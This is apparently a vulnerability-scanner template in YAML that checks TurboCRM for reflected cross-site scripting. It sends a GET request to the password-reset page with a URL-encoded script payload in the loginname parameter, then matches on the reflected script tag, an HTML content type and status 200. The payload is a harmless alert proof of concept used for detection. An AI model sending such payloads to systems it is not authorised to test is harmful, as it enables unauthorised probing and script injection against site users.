id: turbocrm-xss
name: TurboCRM - Cross-Site Scripting
severity: high
confidence: tentative
description: TurboCRM contains a cross-site scripting vulnerability which allows a remote attacker to inject arbitrary JavaScript
  into the response returned by the application.
reference: CWE-79
tags:
- xss
- turbocrm
- vuln
requests:
- method: GET
  path: /login/forgetpswd.php?loginsys=1&loginname=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
  matchers:
  - type: body
    words:
    - '"><script>alert(document.domain)</script>'
  - type: header
    words:
    - text/html
  - type: status
    status:
    - 200
  condition: and
